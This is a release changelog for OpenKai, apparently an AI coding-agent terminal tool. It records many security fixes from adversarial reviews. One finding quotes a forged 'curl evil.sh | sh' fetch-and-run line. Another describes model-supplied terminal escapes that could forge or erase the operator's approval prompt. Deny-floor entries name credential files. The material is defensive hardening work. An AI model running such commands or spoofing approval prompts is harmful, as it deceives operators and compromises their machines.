# Changelog

All notable changes to OpenKai are documented here. The project adheres to [Semantic Versioning](https://semver.org/); the release tag style is `v0.01.001` (npm-normalised as `0.1.1`).

## [0.1.9] — v0.1.009 (E019: consolidation & trust — the fixes 0.1.8 missed)

**If you are on 0.1.8, you carry two live bugs that 0.1.9 fixes. Upgrade now.**

v0.1.008 shipped the update-channel work but was cut from a line that missed
two already-landed fix batches. 0.1.9 is the honest follow-up: it ships those
batches, closes the mouse/crash investigation, and hardens everything the
post-cut adversarial pass surfaced. npm versions are immutable — 0.1.8 stays
as-is publicly; 0.1.9 is the consolidation/trust release. That framing is the
point, not feature marketing.

### What 0.1.8 missed (and 0.1.9 delivers)

Users on 0.1.8 carry these defects:

- **Theme-auto stdin kill (CRITICAL).** `detectThemeAsync` called
  `setRawMode(false)` + `pause()` on the TUI's own stdin — the OSC 11 query
  for terminal background colour killed the app on launch. 0.1.9 ships the
  fix (`a1eab24`, E017 round 3): raw-mode state is restored, pause is
  skipped when other data listeners exist, and no OSC-11 reply leaks into
  the focused component's input. This was the most likely root cause of the
  recurring "TUI crashes, numbers change with moving mouse" report.
- **Hub resize-kill / tap-leak.** The served-TUI hub leaked attach sockets on
  close (the `tap` was never removed), crashed on resize during an attach
  hello, and had no session cap or eviction. 0.1.9 ships the fix (`a1eab24`):
  `attachSockets` Set with `untap` on close, `MAX_HOSTED=16` with eviction,
  and `GET /sessions` reads the live map.
- **35 findings from the E017 round-3 adversarial review** (`a1eab24`), all
  fixed in one batch but never shipped in 0.1.8: WS strict decoder
  (directional masking, 4 MiB payload cap, fragmentation rejected);
  headless-host focus stack / pump-order / composite-line fixes; OAuth
  device-flow routing gates; ollama↔ollama-cloud credential collision
  isolation; OPENKAI_HOME split-brain; fusion bandit phantom-arms +
  double-fail removal; saver threshold 0.47; session-name escape injection
  closure; settings autonomy row navigation; calibrate guards; crash-guard
  stderr + finally discipline.
- **Magic keywords** (`fc4cb6e`, E017 round 4): `ultrathink` (fusion think
  panel — multiple models combine reasoning) and `ultrareview` (multi-model
  adversarial diff review over the shadow snapshot), OMP-derived and upgraded
  to multi-model fusion. Composer shimmer, status chip, settings toggles
  (`magicKeywords.{enabled,ultrathink,ultrareview}`), hidden-notice
  discipline. This batch also missed the 0.1.8 cut.

### Mouse investigation + click-to-cursor (E019 inc 01–03)

The CTO-reported crash ("numbers change with moving mouse", recurring
wedged TUI on 0.1.8) was investigated exhaustively. SGR (1006), URXVT (1015),
and X10 mouse traffic was tested against 0.1.8 and the fixed tree: no leak,
no crash. The working hypothesis is the theme-auto stdin kill (above) — the
CTO hit that exact bug before, and 0.1.8 never shipped the fix. Three
defensive layers now hold:

- **Mouse-sequence guard** (`tui/mouse-guard.ts`, E019 inc 02): a last-line
  input guard so NO mouse-shaped sequence (SGR/URXVT-1015/X10) can ever reach
  a component unconsumed, regardless of what the terminal sends. Regex-verified
  against pi-tui's keymap for CSI-final-byte collisions (no keyboard input uses
  `M` as a final byte).
- **Click-to-cursor routing** (`tui/mouse-routing.ts`, E019 inc 03 — Claude
  Code grammar): a click in the transcript moves the composer cursor to the
  clicked point; a press that becomes a drag is swallowed (no selection). The
  router wraps pi-tui's `handleViewportInput` at runtime.
- **Crash guard**: uncaught errors restore the terminal and print the stack to
  stderr — a TUI crash can never wedge the terminal again. If the crash
  recurs, the stderr stack names the fault line.

### Post-cut adversarial pass (E019 inc 04 — qwen3.8-pro, cole@openkai)

A full adversarial re-review of the fix batch + the turn-aliveness
restructure + the mouse/click code. **Gate defects fixed first** (these were
the load-bearing risk — both gates could report green without doing their job):

- **S4 (HIGH, gate)**: `npm test` ran the CLI suite without building
  `dist/`/core first, so a clean checkout died with 181 TS2307 errors before
  one test ran. Root `test` now builds first.
- **S5 (HIGH, gate, fail-open)**: `scripts/security-audit.sh` used
  `|| true` on `git grep`, so in a `.git`-less archive the scan matched
  nothing yet printed PASSED. Now refuses outside a git work tree and
  discriminates `git grep` exit 0/1/≥2.

Behavioural findings (all confirmed with failing reproducers, then fixed):

- **S1 (MEDIUM, trust)**: a failed turn (`stopReason:"error"`) rendered an
  unconditional green `✓ settled` — a failed turn read as success. Now
  renders `✗ failed in Ns` and signals "Turn failed"; the busy latch resets
  so a close-without-turn_end can't leak to the next turn.
- **S2 (MEDIUM, corruption)**: click-to-cursor fed grapheme counts into
  pi-tui's UTF-16 code-unit `cursorCol`, and treated clicked cells as
  graphemes — a click on `x` after two emoji set the cursor inside a
  surrogate pair, corrupting the line on insert. Now uses an explicit
  two-step conversion (cells → graphemes → code units via
  `Intl.Segmenter`).
- **S3 (MEDIUM, upgrade safety)**: `--check` performed the real upgrade and
  `--rollback` forward-upgraded a managed install. Now `--check` is
  read-only (no dispatch) and `--rollback` refuses with pin guidance.

New findings surfaced and fixed this pass:

- **N1 (MEDIUM, render-boundary injection)**: `openkai sessions` listing +
  `--show` printed `/name`-authored session names/snippets raw — OSC 0/52 +
  CSI + TAB reached the operator terminal. Now routed through
  `sanitizeTerminalText` + whitespace-collapse.
- **N2 (MEDIUM, operator deception)**: the model's raw bash `command` +
  dotall `denyReasonFromResult` carried newlines into the per-line
  danger-bordered permission-denied notice — a forged `▎ adjust: curl evil.sh
  | sh` line was indistinguishable from OpenKai chrome. Now flattened.
- **N3 (MEDIUM, corruption)**: the brand busy-sweep painted
  `state.activity` (a model-chosen tool name) by UTF-16 unit, splitting
  astral surrogate pairs with an SGR → U+FFFD every busy frame. Now iterates
  graphemes via `Intl.Segmenter`.
- **N4 (MEDIUM→LOW, auth-gated OOM)**: `?width=200000` in the hub attach
  hello allocated a multi-MB frame before the `resize()` clamp ran. Now
  mirrors `resize()`'s `MAX_COLUMNS=500` clamp at the hello path.

### Turn aliveness restructure (E019 inc 04b — OMP-derived)

- Boot card collapses on first prompt; lazy thinking rows created on the
  first thinking delta (mid-list splice + `reindexOpenTools`); the starburst
  pulse (driven by the 80ms busy tick) settles at turn_end.
- Brand-shimmer on busy activity; `✓ settled in Ns · ↑in ↓out · ⚡tps tok/s`
  settle row with a full stop.
- Access-control surface: denials name tool/target/reason/remediation to the
  operator; model-facing denial text carries config remediation (never
  "run this yourself"); autonomy levels read as plain access language.

### Consciously deferred (scheduled as fast-follows)

These are real but lower-severity / gated / latent, and were held to avoid
piling more changes onto a release candidate. Each has a file:line and a
repro direction.

- **R1** (MEDIUM, latent, gated): `provider-config.ts` env-key strip — a
  newline in `providerId` could inject an extra env line, but no in-repo
  caller reaches the ungated surface. Defense-in-depth strip is a cheap
  fast-follow.
- **R2** (MEDIUM, perf): activity string has no length cap; brand shimmer
  repaints O(n) per 80ms frame. Cheap: `.slice()` at `setActivity`.
- **R3** (MEDIUM, affordance): shimmer paints per wrapped rendered line but
  submit-time detection runs on the full buffer — a multi-line fence
  shimmers but does not reroute. Fix needs detection + paint to share one
  masking pass.
- **R4–R11** (LOW→LOW-MED): magic-keyword boundary classes (`\p{Cf}`/`\p{M}`
  omission), `maskNonProse` XML/PHP gaps, `collapseBoot` reindex symmetry,
  shimmer `setInterval` dispose, hub MAX_HOSTED TOCTOU, WS RFC 6455 control
  frames, `WsChannel.send` backpressure, `setTheme("auto")` dead branch.

Full findings ledger: `docs/HANDOFF_E019_QWEN_LEDGER.md`.

### Governance

- `docs/RELEASE_SOP.md` binding: no publish without explicit CTO consent,
  re-confirmed 2026-08-20 after v0.1.008 went out early. This release is
  PREPARE ONLY — nothing publishes until the CTO says go.
- npm versions immutable: 0.1.8 stays as-is publicly; 0.1.9 is the honest
  follow-up.

## [0.1.8] — v0.1.008 (E017: channel-executing update + signed release channel)

`openkai update` now **executes** the detected channel's own upgrade instead of
printing instructions: brew-managed installs run `brew update && brew upgrade
openkai`; npm installs run `npm install -g @kaidera/openkai@latest|<v>`;
standalone keeps the manifest-driven self-upgrade (sha256 witness + rollback).
Channel detection is build-time (`standalone`/`npm` stamp) plus Homebrew
Cellar-path detection.

### Signed release channel
- `.github/workflows/release.yml` runs on `v0.1.*` tag push: builds all four
  platform binaries, attaches **SLSA build-provenance attestations** (GitHub
  Sigstore), uploads CI-built assets + a fresh `latest.json` (version read from
  the tagged `package.json`). Verify with
  `gh attestation verify <binary> --repo Kaidera-AI/OpenKai`.
- npm publish stays manual and consent-gated (this release).

### Governance
- `docs/RELEASE_SOP.md`: release-control SOP (no publish without explicit CTO
  consent), pre-publish consolidation checklist, local-binary hygiene, Homebrew
  tap-trust platform fact, signed-channel release order.

### 0.1.007-lineage research landed on this line
- OK-9.1 Switchyard tier scorer + `routeWithTier`; subagent `outputSchema`
  steering + `stage` dynamic selection; fusion telemetry dashboard; multi-modal
  (vision) routing; chat connectors (Slack/Telegram) + `bridge --listen`.
## [0.1.7] — v0.1.007 (E017: orchestration composition — and the operator-polish release)

Two epics in one line: the OK-9 composition (shift predicts, fusion
multiplies, the gate verifies — machinery that was callerless in 0.1.6 is
now wired end-to-end and visible), and the E017 operator-polish round
(crash guard, settings pickers, keyless boot done right, fusion pair
configuration, provider write path, and the architecture standards both
OpenKai and KOS now build against). Design base:
`research/2026-08-18-shift-fusion-orchestration-ADR.md` (OK-9),
`research/2026-08-19-served-tui-attach-ADR.md` (OK-10),
`docs/ARCHITECTURE_STANDARDS.md` (S-series).
**377/377 tests + 3/3 e2e + security-audit PASSED.**

### Orchestration (E017)
- **`Orchestrator` facade** (`core/orchestrate.ts`): stage classify → per-stage
  tier latch → override rules → corroborative scorer → pin clamps → posture
  default. In-session: tool signals accumulate from the event stream, the
  tier is decided before each prompt (evidence-only), compaction
  re-evaluates (the Devin free switch point).
- **Cascade completion**: a fusion gate halt escalates the stage one tier
  and retries exactly once.
- **Reward loop**: gate outcomes write bandit posteriors; priors feed
  cast/pair selection.
- **Operator priorities (OK-9.7)**: `shift.posture` + floor/ceiling pins +
  denylists in `~/.openkai/config.json`; settings **routing tab**.
- **Synthesis (OK-9 W4)**: compare-then-compose; judge-first resolution,
  never self-grading; parse failure keeps both role outputs.
- **Calibration (OK-9 W6/W7)**: `openkai fusion calibrate` — quadrants,
  threshold sweep, CPT/APGR, judge break-even.

### TUI visibility & chrome
- **Tier chip** with transition flash; **fusion role pills**; gate verdict
  notices; **`/shift`** routing ledger; **`/diff`** shadow-snapshot overlay.
- **Settings pickers everywhere**: theme / status-line / posture rows open
  visible lists (no blind cycling); `/theme` removed — themes live in
  settings.
- **`/rename`**: session display name on the line directly above the input
  bar (Claude Code grammar), shown in /resume, /sessions, /export.
- **Status-line overflow policy**: low-priority chips drop before any
  truncation; tokens+model never lose.
- **Crash guard**: uncaught errors restore the terminal and print the
  stack — a TUI crash can never wedge the terminal again.
- **Brand splash restored** (the shimmer regression is in the registry ledger).

### Boot & providers
- **Keyless boot, done right**: the boot-time wizard is gone entirely; the
  TUI launches regardless of credential state, and sign-in happens inside
  (overlay auto-opens when unconfigured). Single-key provider fallback.
- **Fusion pair configuration**: `/fuse` menu → two-step provider→model
  pickers for model 1 (architect) and model 2 (builder), session-model and
  self-pair resets; cross-provider pairs work end-to-end.
- **Provider-config write path** (KOS consult): `openkai provider
  list|set|unset` + `provider-config.ts` — one atomic, comment-preserving,
  0600 code path for the TUI, the CLI, and KOS Settings; aliases
  (ollama_cloud→ollama-cloud, moonshot→moonshotai); OPENKAI_HOME honoured
  everywhere.
- **Ollama lanes** (`ollama` keyless local + `ollama-cloud`) and the full
  provider-table completeness pass.

### Cherry-picks from the omp/pi code-mining dossiers
- **Real LLM compaction** (`transport.compactSession()` — pi-agent-core's
  summarising engine; elision deleted) for `/compact` and auto-compact.
- **Steer-while-busy**: mid-turn input steers the running turn.
- **Fork picker** (rewind to any past user message), **session search**
  (`re:`/quoted/fuzzy) + `/resume` picker, **`/export`** (self-contained
  HTML transcript), **word-level diffs**, **bracketed-paste decode**,
  **atomic paste-marker backspace**, **history-search highlighting**,
  **live subagent progress rows**.
- **Persisted per-tool approvals** (`tools.approval.<tool>`) with the
  overlay's session-vs-project split and an actionable headless error.

### Design & process
- **ADRs**: OK-9 (orchestration), OK-10 (served TUI — browser attach as a
  product-owned surface; OpenKai stays fully independent; KOS consumes,
  never co-owns).
- **`docs/ARCHITECTURE_STANDARDS.md` (S-series)**: the binding design law
  for OpenKai and KOS.
- **`Program/FEATURE_REGISTRY.md`**: the release gate walked it — every
  ✅/🔁 row verified against this build.
- **Release trust root**: Ed25519 release key pinned into standalone
  builds; manifests signed by the release pipeline (fail-closed on
  unsigned).

## [0.1.6] — v0.1.006 (K3 adversarial review + keyless boot)

Two full adversarial passes (ren@openkai's E012 review of 0.1.5, then kai's K3
request against the E014/E015 surface) — 80+ findings reviewed, every
confirmed one fixed and pinned. Plus the fresh-install boot contract: **the
TUI never refuses to start** — missing credentials open sign-in inside the
running shell (CTO directive).

### Boot & first run (0.1.6)
- **Keyless boot**: a machine with no API keys launches the TUI, shows the
  capability row, and auto-opens the sign-in overlay; key/OAuth entry takes
  effect on the next prompt (auth resolves per request). Headless paths
  (`chat`, `serve`) keep their named exits.
- **Single-key provider fallback**: a box with one NVIDIA key boots into the
  NVIDIA lane (not a dead openrouter default); model defaults derive from the
  bundled catalogue, so every lane is bootable offline.
- **One credential store everywhere**: every catalogue/stream call site now
  uses the persistent `FileCredentialStore` factory — OAuth logins survive
  restarts on the fusion lane too.

### K3 review fixes (E014/E015 surface)
- **Tier scorer fidelity** (Switchyard calibration): `failing`/`passing`/
  Jest ✕ recognised; structural `*Error`/`*Exception` matching; plain nonzero
  exits score SOFT 0.3 as calibrated; gate refusals no longer read as tool
  friction; negated passes ("did not pass") count as failure evidence; bash
  writes (`sed -i`, redirection, `tee`) count as production — phantom
  "spinning" misroutes closed.
- **routeWithTier**: per-stage fall-open (plan/review rest on the capable
  member), `defaultTier` option (the OK-9.7 posture seam), full type
  narrowing.
- **task tool**: stage→model resolution threads the cast's provider (was dead
  by default); review stage loud-fails without a `judgeModel`; pre-aborted
  children never start a run; `transport.prompt()` after `close()` rejects;
  outputSchema extractor tries all fenced blocks + balanced spans, reads
  required keys from formal JSON Schema, caps output at 64 KiB; operator
  casts (`~/.openkai/config.json`) plumbed through; `web_fetch` honours the
  caller's AbortSignal.
- **Fusion telemetry**: wrong-shape log lines can't crash the dashboard;
  rotation re-reads + merges before rewriting (concurrent writers kept);
  pair keys provider-qualified; self-pairs render honestly; `__proto__` gate
  keys counted; log-sourced strings stripped of control bytes.
- **Bridge `--listen`** brought to hub posture and made correct: instant ack
  + async relay with event-id dedup (Slack's 3s retries no longer multiply
  paid turns), `url_verification` handshake answered, bot/subtype events
  dropped (self-loop guard), timing-safe bearer compare, 1 MiB body cap,
  Host allowlist, `/health`, request timeout, fixed error contract,
  `--hub-host` for IPv6-bound hubs. Shared `http-common.ts` helpers — one
  hardened implementation for both listeners.

### E012 review fixes (0.1.5 surface, landed with this release)
- **hashline_edit gated** (was an ungated arbitrary file write): approval
  round-trip, deny floor, canonical containment, shadow snapshot.
- **Upgrade trust root**: project `.env` can no longer set `OPENKAI_*` /
  `CORTEX_*` knobs; release-key pin seam (`OPENKAI_RELEASE_KEY` build define,
  fail-closed once pinned); `install.sh` performs the sha256 verification its
  header claimed.
- **MCP**: tools merge (never replace built-ins), execute through the
  permission gate, spawn with a secret-scrubbed environment.
- **Sessions**: resume rehydrates header/seq/parent chain; corrupt JSONL
  tails tolerated; per-session advisory locks.
- **Gate liveness**: abort/close settle pending approvals (`rejectAll`);
  gated `bash` honours abort + timeout; control events can't be dropped by
  the bounded event queue; plan mode enforced at the gate.
- **TUI**: every model/tool render path sanitised (status chip, notices,
  previews, attention); `submit()` busy guard; Ctrl+K palette bound; provider
  errors render as error turns; `/model <id>` works; auto-compact is
  idle-only.
- **Deny floor extended**: ed25519/ecdsa keys, `.npmrc`/`.netrc`/`.pypirc`,
  `.aws`/`.azure`/`.kube`/`.gnupg`, `*.p12`/`*.pfx`/keystores.

### Research (this release's design base)
- `research/2026-08-18-switchyard-routing-fusion-deep-dive.md` — 34+ primary
  sources; what Switchyard is based on (arXiv:2603.20895), routing + fusion
  literature distilled.
- `research/2026-08-18-shift-fusion-orchestration-ADR.md` — OK-9: shift
  predicts, fusion multiplies, the gate verifies; OK-9.7 operator postures
  and pins.
- `research/2026-08-18-e015-research-match-integration-review.md` — the
  S1–S5 landing order (TUI visibility slice, orchestration facade).

**263/263 tests green; typecheck clean; `scripts/security-audit.sh` PASSED.**

## [0.1.5] — v0.1.005 (the harness release: omp functionality, droid feel, Kaidera brand)

Twenty-plus increments (E002–E011) fold the best of omp (functionality) and
droid (look & feel) onto the Kaidera brand mark, per the CTO formula. The
CLI and core bump to 0.1.5 in lockstep.

### Brand & boot
- **Kaidera hex-node mark** (ren): 15-line circuit hexagon for the splash,
  sharp 8-line compact variant for the boot card; gradient engine lifted from
  omp (5-stop truecolour diagonal gradient + shine traversals, 256-colour
  fallback). Splash plays on **every** launch (any key skips; `openkai splash`
  replays). Boot card: hex + wordmark + capability row + daily tip.
- **Theme auto-detection** (OSC 11 query, COLORFGBG fallback, 150ms budget);
  config `theme: auto|dark|light|<pack>`.

### TUI / settings
- **`/settings` vs `/setup` split**: six-tab config panel (appearance /
  providers / model / interaction / memory / features) with status-line
  presets; `/setup` opens onboarding (provider sign-in). `/welcome` removed.
- **In-TUI sign-in**: OAuth device-flow overlay (Claude Pro/Max, Codex, Kimi,
  Copilot) + key-entry overlay writing `~/.openkai/.env` (0600). No hand-editing.
- **Two-sided status line** (omp footer layout): brand glyph + agent +
  provider + `git:<branch>` + persist + session + state + `plan` + `ctx:%`
  left, tokens + model right; presets default/minimal/compact/full.
- **Opaque overlays** (no transcript bleed), `/model` five-level picker
  (provider→model→effort→partner-provider→partner-model) with ctx+cost
  columns, `/models` fullscreen hub (recent/all/per-provider scopes).
- **`/autonomy` picker**, **`/plan`** (Cline Plan/Act: read-only at the gate),
  **`/goal`** lifecycle, **`.`** keep-going, **Ctrl+R** history search.

### Context & memory
- **`/compact` `/shake` `/clear` `/context` `/stats`** operate on the real
  conversation via `transport.getMessages/setMessages/getContextWindow`.
- **Auto-compact** (OpenCode): elide the middle at 80% context (feature-gated).
- **`/memory`**: shared multi-agent, multi-instance project memory
  (`.openkai/memory/`), surfaced on boot; **`/init`** generates AGENTS.md.

### Tools (6 → 12+)
- `glob`, `web_fetch`, `todo`, **`hashline_edit`** (line-anchored structured
  edits with content-hash staleness validation), **`task`** (read-only
  subagent), **`lsp`** (symbol-aware code intelligence), **MCP** proxy
  (`~/.openkai/mcp.json`, JSON-RPC over stdio).

### Hub & connectors
- **`openkai serve`**: loopback-only HTTP hub (refuses non-loopback hosts and
  starts only with `OPENKAI_HUB_TOKEN`); `POST /prompt`, `/sessions` and
  `/memory` bearer-gated; only `/health` is token-free. **`openkai bridge`**:
  pipe-line chat connector relaying into the hub.

### Security posture (E012 adversarial pass — ren@openkai)
- Full deep review (six parallel slices, every finding source-verified) followed
  by a same-release fix programme. Headline closures:
  - **`hashline_edit` is now gated**: approval round-trip, deny floor, canonical
    containment (sibling-prefix + symlink escapes closed), shadow snapshot —
    same posture as `write_file`/`edit_file`. Previously it wrote ungated.
  - **MCP tools merge, never replace** the built-in set, execute **through the
    permission gate**, and spawn with a **secret-scrubbed environment**
    (`procenv.ts`; `mcp test` probes with a minimal env).
  - **Upgrade trust root hardened**: project `.env` can no longer set
    `OPENKAI_*`/`CORTEX_*` knobs (credential-names-only allowlist), release-key
    pinning seam (`OPENKAI_RELEASE_KEY` build define, fail-closed when pinned),
    loud warning when unsigned; `install.sh` now performs the sha256 check its
    header always claimed.
  - **Hub**: bearer required on `/sessions` + `/memory`, Host-header allowlist,
    timing-safe token compare, IPv6 bind fixed, 1 MiB body cap; `bridge --port`
    validated (userinfo-injection token leak closed).
  - **Plan mode enforced at the gate** (in-flight turns included), single
    source of truth on the transport; abort/close settle pending approvals
    (`rejectAll`) and kill gated `bash` children; control events can no longer
    be dropped by the bounded event queue.
  - **Session resume** rehydrates header/seq/parent chain (no more duplicate
    headers); corrupt JSONL tails tolerated; per-session advisory locks.
  - **Fusion**: gate timeouts no longer masquerade as exit 127 (spurious
    repairs), repaired gates re-pass operator consent, telemetry redacts before
    persist/export, corrupt log lines can't zero bandit history.
  - **Shadow git** strips ambient `GIT_*` (a poisoned `GIT_INDEX_FILE` no longer
    touches the real index) and snapshots gitignored files (`add -A -f`).
  - **TUI**: every model/tool render path sanitised (status chip, notices,
    previews, attention notifications), `submit()` busy guard, Ctrl+K palette
    key bound, error turns render.
  - **Auth**: OAuth credentials persist to `~/.openkai/auth.json` (0600) via a
    shared file-backed `CredentialStore` — `login` survives restarts.
- Regression coverage: `test/security-repro-e012.test.ts` pins the fixed
  contracts. 238/238 green.

### Packaging
- npm: `@kaidera/openkai@0.1.5` + `@kaidera/openkai-core@0.1.5` (dist-tag
  `latest`), release tag `v0.1.005`. Standalone binaries rebuilt.

## [0.1.4] — Inc 09 parity pack (TUI liveness + activity feed)

Publishes the unpublished Inc 09 delta that main carried under the stale 0.1.3
version string, and re-syncs all three channels (npm, standalone binaries,
Homebrew tap) so the UAT plan is executable end-to-end. The CLI and core are
bumped to 0.1.4 **in lockstep** (the CLI pins `@kaidera/openkai-core@0.1.4`) so
an install resolves the matching core at publish time — the exact skew that made
0.1.1 and 0.1.3 invisible is closed.

### TUI / Inc 09
- **Slash autocomplete** on `/`, a provider→model picker (`/model`), effort cycle (`/effort`), and fast mode (`/fast`).
- **TUI liveness + activity feed**: animated busy chip (braille frame + current action + elapsed seconds, awaiting/attention priority preserved), provider chip in the chrome, an `onActivity` sink in the transport, a `.openkai/activity.jsonl` feed, and the `openkai tail [-f]` command to watch the machine think from a second terminal.
- **`openkai update`** alias for upgrade: Homebrew-managed installs refuse self-upgrade (Homebrew owns the Cellar) with `brew upgrade` guidance; npm guidance uses the scoped name.

### Packaging
- npm: `@kaidera/openkai@0.1.4` + `@kaidera/openkai-core@0.1.4` (dist-tag `latest`).
- Standalone binaries rebuilt from the certified main tip and attached to `v0.01.004` (darwin-arm64/x64, linux-arm64/x64).
- Homebrew tap `Formula/openkai.rb` repointed to `v0.01.004` with recomputed sha256 values.

### Security baseline
- Security-critical sources (`packages/core/src/fusion/{fuse,gate,synthesis}.ts`) are logic-identical to the E001-certified line (only trailing-newline whitespace differs); `scripts/security-audit.sh` PASSED; 110/110 green.

### Known gaps
- F10 (LOW): `list_files` on a `.ssh` *directory* node still lists filenames (contents remain denied).

## [0.1.3] — TUI stability fix

- Fixes the TUI exit-after-first-turn regression (the session stream no longer closes on `agent_end`; chat exits explicitly on `session_end`; drain helpers break on `session_end`).
- Bare-launch flags: `openkai --provider X` launches the TUI directly.

## [0.1.2] — security patch

**0.1.1 shipped without the certified E001 security fixes and should not be used.** The fix-line was certified on a branch that had diverged from the release line, so the published tarballs were built without it. Upgrade with `npm install -g @kaidera/openkai@0.1.2`.

### Security
- **F4 (HIGH) — deny-floor escape.** A protected name used as a *directory* component (`.env/production`, `server.pem/privkey`) bypassed the permission deny floor and was allowed. `matchesDenyFloor` now tests every ancestor prefix of the path, not just the final segment.
- **F7 / F7b (HIGH) — secret leakage in persistence.** Sessions stored provider keys and secret-shaped values verbatim in world-readable files, and the Cortex `/sessions/ingest` leg was unredacted. Redaction now happens at the write seam and the wire seam via the shared `secrets` module (by NAME and by secret-shaped VALUE), and session files are created `0700`/`0600`.
- **F6b / F6c (HIGH) — spoofable consent surface.** The permission overlay and transcript tool cards rendered model-supplied terminal escapes (OSC 52 clipboard writes, CSI screen clears) verbatim, letting a model forge or erase the approval prompt. Every model-influenced field — tool name, command, diff path, diff body, rule/reason, and tool arg **keys** as well as values — is sanitised and newline-flattened at the render boundary.
- **F5 / F5b (MED) — content/existence oracle.** `edit_file` read its target before the permission gate ran, leaking the content and existence of floor-protected and out-of-cwd files. `guardPath` now precedes any read.
- **F9 (MED) — fusion gate fail-open.** A designed gate with no consent channel executed model-authored shell with the parent environment inherited. Absent consent is now a refusal, and approved checks run with a scrubbed child environment.

Each fix ships with an executable reproducer; the suite is 110/110 green, and reverting the fix sources and rebuilding fails exactly the nine security reproducers.

### Known gaps
- F10 (LOW): `list_files` on a `.ssh` *directory* node still lists filenames (contents remain denied).
- The standalone binary channel (`scripts/install.sh`, Homebrew tap) still points at the `v0.01.001` release assets, which were built from the vulnerable line. Use the npm channel until those assets are rebuilt.

## [0.1.1] — v0.01.001 (first public release)

### Harness
- Single-lane agent loop on `pi-agent-core` (0.84.2 pinned) with pi-ai's 30+ provider substrate; `openkai chat` print mode and `openkai`/`openkai tui` alt-screen TUI share one `SessionTransport` (field-addressed deltas, `openkai.session.v1`).
- Providers: `--provider` across chat/tui/fuse — OpenRouter aggregator plus direct anthropic, openai, google, deepseek, kimi-coding, moonshotai, qwen-token-plan, xai, mistral, groq, cerebras, together, fireworks, nvidia, minimax, zai, vercel-ai-gateway; OAuth subscription lanes for openai-codex and github-copilot. `.env` autoload with env-wins semantics.
- Session persistence: pi JSONL v3 branchable session trees under `.openkai/sessions/`; idempotent Cortex checkpoints (`/sessions/ingest`) and lifecycle events when KOS-managed; standalone-local mode needs nothing.

### TUI
- pi-tui shell: transcript (markdown), composer, status chrome (mode/model/session/tokens/persist mode), slash commands, command palette with fuzzy filter, prompt stash + frecency history, `/btw` side channel, `/undo`, focus-aware attention notifications, per-agent identity pills.
- Permission engine (protocol v2 approval channel): allow/ask/deny, last-match-wins rules, terminal deny floor, inline diff previews, once/always/reject; gated `write_file`/`edit_file`/`bash`. Remote approval injection refused by construction (respond() is in-process only).
- Shadow-git undo: full-tree snapshots before every approved mutation; `openkai undo` restores.
- Droid design discipline: theme-token-only colours, one interaction grammar, clean-by-default density, brand splash exactly once.

### Fusion
- `openkai fuse`: FU-1 role-split panel (architect + builder, separate fresh sessions, parallel), FU-2 attributed synthesis (unattributed merges hard-error), FU-3 gate-first validation (validator-designed executable checks, baseline-must-fail-RED, verbatim feedback, repair-once, loud halt).
- `openkai fusion report|advise`: FU-5 per-pair telemetry rollups; FU-4 deterministic invocation policy (no model calls on the dispatch path); Beta-bandit routing with per-complexity posteriors.

### Security
- E001 gate: per-increment `scripts/security-audit.sh` + white-box review protocol. Canonical realpath containment (symlink-escape fix), case-insensitive + NFC-normalised deny floor, floor enforcement at the tool layer for read-only tools, recursive-grep re-guarding.

### Packaging
- MIT licence; npm packages `@openkai/core` + `@openkai/cli`; standalone per-platform binaries via `bun build --compile`; dual-channel auto-upgrade with rollback and kill-switch; `openkai info` self-check.
